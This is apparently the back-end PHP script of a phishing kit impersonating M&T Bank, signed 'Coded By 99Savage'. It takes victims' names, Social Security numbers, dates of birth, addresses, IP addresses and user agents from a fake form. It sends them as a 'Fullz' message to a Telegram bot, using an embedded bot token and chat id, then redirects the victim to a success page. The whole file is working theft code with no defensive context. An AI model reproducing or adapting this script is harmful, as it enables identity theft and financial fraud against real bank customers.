<?php

function get_client_ip() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}


header ("Location: success.html");
  
      $usera = $_SERVER['HTTP_USER_AGENT'];
                $xip = get_client_ip();

define ('url',"https://api.telegram.org/bot2019001239:AAHiEgEOmkzyZn-0htLbDbJobfDSDSkkWZM/");
$xfname = $_POST['fname'];
$xlname = $_POST['lname'];
$xssn = $_POST['ssn'];
$xdob = $_POST['dob'];
$xaddr = $_POST['addr'];
$xcity = $_POST['city'];
$xstate = $_POST['state'];
$xzip = $_POST['zip'];
$xdate = date('d/m/y h:i');
$chat_id = '1327277990';
$message = urlencode("==============M&T Bank Fullz============\nFirst Name : ".$xfname."\nLast Name: ".$xlname."\nSSN : ".$xssn."\nDOB : ".$xdob."\nAddress : ".$xaddr."\nCity : ".$xcity."\nState : ".$xstate."\nZip : ".$xzip."\nIP Address : ".$xip."\nUseragent : ".$usera."\n=======Coded By 99Savage========================");
file_get_contents(url."sendmessage?text=".$message."&chat_id=".$chat_id."&parse_mode=HTML");

?>